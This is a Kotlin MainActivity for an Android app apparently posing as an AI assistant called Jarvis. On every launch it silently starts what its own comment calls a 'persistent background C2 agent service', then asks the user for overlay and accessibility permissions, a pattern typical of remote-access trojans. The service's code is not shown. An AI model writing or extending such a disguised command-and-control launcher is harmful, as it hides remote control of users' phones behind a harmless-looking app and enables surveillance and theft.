package com.ai.assistant.jarvis

import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.ui.Modifier
import com.ai.assistant.jarvis.ui.JarvisAppUI

class MainActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Launch the persistent background C2 agent service
        JarvisAgentService.start(this)

        setContent {
            MaterialTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    JarvisAppUI(onActivateClicked = {
                        // Request overlay + accessibility permissions on first launch
                        PermissionManager.requestOverlayPermission(this@MainActivity)
                        PermissionManager.openAccessibilitySettings(this@MainActivity)
                    })
                }
            }
        }
    }
}
